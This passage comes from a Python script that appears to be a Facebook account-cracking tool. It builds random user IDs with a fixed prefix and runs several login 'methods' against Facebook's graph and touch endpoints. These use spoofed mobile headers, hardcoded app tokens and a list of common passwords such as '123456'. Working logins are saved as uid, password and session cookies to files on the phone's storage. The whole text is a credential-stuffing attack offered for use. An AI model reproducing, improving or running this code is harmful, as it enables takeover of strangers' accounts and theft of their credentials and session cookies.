        xp=f"{bx}[{gx}MR{bx}]{gx}"
        sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
        ua = random.choice(ugen)
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_GB','client_country_code': 'GB','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers = {'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://graph.facebook.com/auth/login'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                uid = po['uid']
                                coki = ';'.join(i['name']+'='+i['value'] for i in po['session_cookies'])
                                year = tutulx(str(uid))
                                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                if 'y' in show_cookies:
                                    print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                                os.system('espeak -a 300 "GEN,  Ok,  id"')
                                open('/sdcard/GEN-M4-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                                oks.append(str(uid))
                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                uid = po['error']['error_data']['uid']
                                if 'y' in pcp:
                                    year = tutulx(str(uid))
                                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                                    os.system('espeak -a 300 "Cp"')
                                open('/sdcard/GEN-M4-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                cps.append(str(uid))
                                break
                        else:continue
                loop+=1
        except Exception as e:pass

#------------->> RANDOM METHOD M5 >>-------------#
def ____M_E_T_H_O_D_E____(ids,passlist,tl):
	global loop,oks,cps,twf
	xp=f"{bx}[{gx}MR{bx}]{gx}"
	sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
	ewe = requests.Session()
	ua = random.choice(ugen)
	
	# Single GET request to get tokens once
	try:
		link = ewe.get("https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8").text
		# Extract tokens once
		m_ts = re.search(r'name="m_ts" value="(.*?)"', str(link)).group(1)
		li_val = re.search(r'name="li" value="(.*?)"', str(link)).group(1)
		jazoest = re.search(r'name="jazoest" value="(\d+)"', str(link)).group(1)
		lsd_val = re.search(r'name="lsd" value="(.*?)"', str(link)).group(1)
	except:
		return
	
	# Now loop through passwords using the same tokens
	for pas in passlist:
		try:
			data = {"m_ts": m_ts,"li": li_val,"try_number": 0,"unrecognized_tries": 0,"email": ids,"prefill_contact_point": ids,"prefill_source": "browser_dropdown","prefill_type": "contact_point","first_prefill_source": "browser_dropdown","first_prefill_type": "contact_point","had_cp_prefilled": True,"had_password_prefilled": False,"is_smart_lock": False,"bi_xrwh": 0,"encpass": "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),"bi_wvdp": '{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":true,"hwcr":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":true,"permission_query_toString":"function query() { [native code] }","permission_query_toString_toString":"function toString() { [native code] }","has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',"jazoest": jazoest,"lsd": lsd_val}
			headers = {"Host": "touch.facebook.com","content-length": str(len((data))),"sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="{}", "Google Chrome";v="{}"'.format(re.search(r'Chrome/(\d+)', str(ua)).group(1),re.search(r'Chrome/(\d+)', str(ua)).group(1)),"sec-ch-ua-mobile": "?1","user-agent": ua,"x-response-format": "JSONStream","content-type": "application/x-www-form-urlencoded","x-fb-lsd": lsd_val,"viewport-width": "360","x-requested-with": "XMLHttpRequest","x-asbd-id": "129477","dpr": "2","sec-ch-prefers-color-scheme": "light","sec-ch-ua-platform": '"Android"',"accept": "*/*","origin": "https://touch.facebook.com","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			response = ewe.post("https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data = data,headers = headers,allow_redirects = False)
			if "checkpoint" in ewe.cookies.get_dict():
				uid = ewe.cookies.get_dict()['checkpoint'].split('3A')[1].split('%')[0]
				if 'y' in pcp:
				    year = tutulx(str(uid))
				    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
				    os.system('espeak -a 300 "Cp"')
				open('/sdcard/GEN-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
				cps.append(str(uid))
				break
			elif "c_user" in ewe.cookies.get_dict():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ewe.cookies.get_dict().items() ])
				uid = re.findall('c_user=(.*);xs', kuki)[0]
				year = tutulx(str(uid))
				print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
				if 'y' in show_cookies:
				    print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+kuki);print('')
				os.system('espeak -a 300 "GEN,  Ok,  id"')
				open('/sdcard/GEN-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+kuki+'\n')
				oks.append(str(uid))
				break
		except requests.exceptions.ConnectionError:time.sleep(15)
	loop +=1
	
#------------->> RANDOM METHOD M6 >>-------------#
def ____M_E_T_H_O_D_F____(ids,passlist,tl):
    global loop,oks,cps,twf
    if not check_internet():
        wait_for_internet()
    xp=f"{bx}[{gx}MR{bx}]{gx}"
    sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
    ua = random.choice(ugen)
    
    for pas in passlist:
        # Use Nigerian user agent
        ua = random.choice(ugen)
        
        datax = {
            'adid': str(uuid.uuid4()), 
            'format': 'json', 
            'device_id': str(uuid.uuid4()), 
            'email': ids, 
            'password': pas, 
            'generate_analytics_claims': '1', 
            'community_id': '', 
            'cpl': 'true', 
            'try_num': '1', 
            'family_device_id': str(uuid.uuid4()), 
            'credentials_type': 'password', 
            'source': 'login', 
            'error_detail_type': 'button_with_disabled', 
            'enroll_misauth': 'false', 
            'generate_session_cookies': '1', 
            'generate_machine_id': '1', 
            'currently_logged_in_userid': '0', 
            'fb_api_req_friendly_name': 'authenticate'
        }
        
        header = {
            'User-Agent': ua, 
            'Accept-Encoding': 'gzip, deflate', 
            'Accept': '*/*', 
            'Connection': 'keep-alive', 
            'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 
            'X-FB-Friendly-Name': 'authenticate', 
            'X-FB-Connection-Bandwidth': str(random.randint(20000000, 50000000)), 
            'X-FB-Net-HNI': str(random.randint(20000, 40000)), 
            'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 
            'X-FB-Connection-Type': random.choice(['WIFI', 'CELLULAR', 'MOBILE.4G']), 
            'Content-Type': 'application/x-www-form-urlencoded', 
            'X-FB-HTTP-Engine': 'Liger',
            'X-FB-Client-IP': 'True',
            'X-FB-Server-Cluster': 'True'
        }
        
        try:
            lo = requests.post('https://b-graph.facebook.com/auth/login', data=datax, headers=header, allow_redirects=False, timeout=30).json()
            
            if 'session_key' in lo:
                cki = lo['session_cookies']
                ck = {}
                for xk in cki:
                    ck.update({xk['name']: xk['value']})
                coki = ';'.join(['%s=%s' % (key, value) for key, value in ck.items()])
                uid = lo['uid']
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                if 'y' in show_cookies:
                    print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                open('/sdcard/GEN-M6-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                oks.append(str(uid))
                break
            elif 'www.facebook.com' in lo['error']['message']:
                uid = lo['error']['error_data']['uid']
                if 'y' in pcp:
                    year = tutulx(str(uid))
                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                    os.system('espeak -a 300 "Cp"')
                open('/sdcard/GEN-M6-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                cps.append(str(uid))
                break
            else:
                continue
                
        except requests.exceptions.ConnectionError:
            continue
        except requests.exceptions.Timeout:
            continue
        except json.JSONDecodeError:
            continue
        except Exception as e:
            continue
            
    loop +=1
  
#------------->> RANDOM METHOD M7 >>-------------#
def ____M_E_T_H_O_D_G____(ids,passlist,tl):
    global loop,oks,cps,twf
    if not check_internet():
        wait_for_internet()
    xp=f"{bx}[{gx}MR{bx}]{gx}"
    sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
    ua = random.choice(ugen)
    
    for pas in passlist:
        if not check_internet():
            wait_for_internet()
        try:
            data = {
                "adid": str(uuid.uuid4()),
                "format": "json", 
                "device_id": str(uuid.uuid4()),
                "cpl": "true",
                "family_device_id": str(uuid.uuid4()),
                "credentials_type": "device_based_login_password",
                "error_detail_type": "button_with_disabled", 
                "source": "device_based_login",
                "email": ids,
                "password": pas,
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "generate_session_cookies": "1",
                "meta_inf_fbmeta": "",
                "advertiser_id": str(uuid.uuid4()),
                "currently_logged_in_userid": "0",
                "locale": "en_US",
                "client_country_code": "US",
                "method": "auth.login",
                "fb_api_req_friendly_name": "authenticate",
                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                "api_key": "882a8490361da98702bf97a021ddc14d"
            }
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Host": "graph.facebook.com", 
                "User-Agent": ua,
                "X-FB-Net-HNI": "45204",
                "X-FB-SIM-HNI": "45201", 
                "X-FB-Connection-Type": "MOBILE.LTE",
                "X-Tigon-Is-Retry": "False",
                "x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62",
                "x-fb-device-group": "5120",
                "X-FB-Friendly-Name": "ViewerReactionsMutation", 
                "X-FB-Request-Analytics-Tags": "graphservice",
                "Accept-Encoding": "gzip, deflate",
                "X-FB-HTTP-Engine": "Liger",
                "X-FB-Client-IP": "True",
                "X-FB-Server-Cluster": "True", 
                "x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62",
                "Connection": "Keep-Alive"
            }
            url = 'https://graph.facebook.com/auth/login'
            po = requests.post(url, data=data, headers=headers).json()
            
            if 'session_key' in po:
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                uid = po['uid']
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                if 'y' in show_cookies:
                    print(f'\r\r\x1b[1;90m[\U0001F4A5\x1b[1;90m]\033[1;37m '+coki);print('')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                open('/sdcard/GEN-M7-RNDM-OK.txt','a').write(str(uid)+'|'+pas+'|'+coki+'\n')
                oks.append(str(uid))
                break
            elif 'www.facebook.com' in po['error']['message']:
                uid = po['error']['error_data']['uid']
                if 'y' in pcp:
                    year = tutulx(str(uid))
                    print(f'\r\r\x1b[1;90m[\x1b[38;5;205mGEN-CP\x1b[1;90m]\x1b[38;5;205m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                    os.system('espeak -a 300 "Cp"')
                open('/sdcard/GEN-M7-RNDM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                cps.append(str(uid))
                break
        except Exception as e:
            continue
    loop += 1

#------------->> OLD MAIN MENU >>-------------#
def ____O_L_D____():
	clear();print(f'{xd} EXAMPLE {bx}:{gx} 5555 {bx}|{gx} 7777 {bx}|{gx} 9999 {bx}|{gx} 99999 ');linex();limit = int(input(f'{xdx} SELECTION {bx}:{wx} '))
	___B_A_L___ = "10000"
	for ixx in range(int(limit)):khalifa = str(random.choice(range(1000000000,1999999999)));user.append(khalifa)
	with tred(max_workers=40) as ____D_O_N____:
		clear();tl=str(len(user))
		print(f'{xd} TOTAL LIMIT {bx}:{wx} {tl} ');print (f'{xd} FLIGHT MODE {wx}ON{bx}|{wx}OFF{gx} EVERY {wx}3{gx} MINUTES ');linex()
		for lover in user:
			ids = ___B_A_L___ + lover
			passlist = ["123456","1234567","12345678","123456789","123123","143143","1234567890","112233"]
			____D_O_N____.submit(___M_T_D_X___,ids,passlist)
	linex();print(f"\n{wx}{47*'-'}");print(f'{xd} THE PROCESS HAS COMPLETED');print(f'{xd} TOTAL OK UID {bx}:{gx} ' + str(len(oks)));print(f"\n{wx}{47*'-'}");exit()

#------------->> OLD METHOD M1 >>-------------#
def ___M_T_D_X___(ids,passlist):
    global loop,oks,cps,twf
    xp=f"{bx}[{gx}MR{bx}]{gx}"
    sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
    ua = random.choice(ugen)
    try:
        for pas in passlist:
            data = {'adid':str(uuid.uuid4()),'email':ids,'password':pas,'cpl':'true','credentials_type':'device_based_login_password',"source": "device_based_login",'error_detail_type':'button_with_disabled','format':'json','generate_session_cookies':'1','generate_analytics_claim':'1','generate_machine_id':'1',"family_device_id": str(uuid.uuid4()),"advertiser_id": str(uuid.uuid4()),"locale":"en_US","client_country_code":"US","device_id": str(uuid.uuid4()),"method": "auth.login","api_key": "882a8490361da98702bf97a021ddc14d","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
            head = {'content-type':'application/x-www-form-urlencoded','Host': 'graph.facebook.com','x-fb-sim-hni':str(random.randint(20000,40000)),'X-FB-Connection-Type': 'WIFI','Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','user-agent':ua,'x-fb-net-hni':str(random.randint(20000,40000)),'x-fb-device-group': '5120','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-connection-bandwidth':str(random.randint(20000000,30000000)),'x-fb-connection-quality':'EXCELLENT','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62','x-fb-friendly-name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','accept-encoding':'gzip, deflate','x-fb-http-engine':'Liger'};url = "https://graph.facebook.com/auth/login"
            response = requests.post(url,data=data,headers=head,verify=True).json()
            if "access_token" in response:
                uid = response['uid']
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                open('/sdcard/GEN-OLD-OK-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                oks.append(str(uid))
                break
            elif "www.facebook.com" in response.get("error", {}).get("message", ""):
                uid = response['error']['error_data']['uid']
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                open('/sdcard/GEN-OLD-OK-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                oks.append(str(uid))
                break
            else:continue
        loop += 1
    except Exception as e:pass

#------------->> END SCRIPT >>-------------#
# Start the key authentication
On()